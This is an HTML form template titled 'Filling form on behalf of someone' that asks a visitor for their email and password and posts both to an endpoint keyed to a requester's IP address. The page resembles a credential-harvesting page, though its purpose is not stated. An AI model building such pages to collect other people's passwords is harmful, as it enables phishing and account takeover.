<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Filling form on behalf of someone</title>
    <!-- CSS only -->
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <style>
        #overall-container{
            display:flex;
            justify-content:center;
        }
        #email-entry,#password-entry{
            width:100%;
        }
        #authentication-form{
            margin-top:10%;
            display:flex;
            flex-direction:column;
            gap:20px;
        }

    </style>
</head>
<body>
    
    <div id="overall-container">
        <form id="authentication-form" action="/help-fill/{{request_from_ip}}" method="POST">
            <h5>Please i need your help in filling out this form</h5>
            <div>
                <label for="email-entry" class="form-label">Email address</label>
                <input type="email" class="form-control" id="email-entry" placeholder="name@example.com" name="email">
            </div>
            
            <div>
                <label for="password-entry" class="form-label">Password</label>
                <input type="password" class="form-control" id="password-entry" placeholder="thisismypassword" name="password">
            </div>

            <div>
                <label for="ip-address-receiver-entry" class="form-label">Request from ip</label>
                <input type="text" class="form-control" id="ip-address-receiver-entry" placeholder="{{request_from_ip}}" value="{{request_from_ip}}" name="ip_address_receiver" disabled>
            </div>
            
            <button id="login-btn" class="btn btn-primary" type="submit">Submit Form on behalf</button>
        </form>
    </div>
      
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="main.js"></script>
</body>
</html>
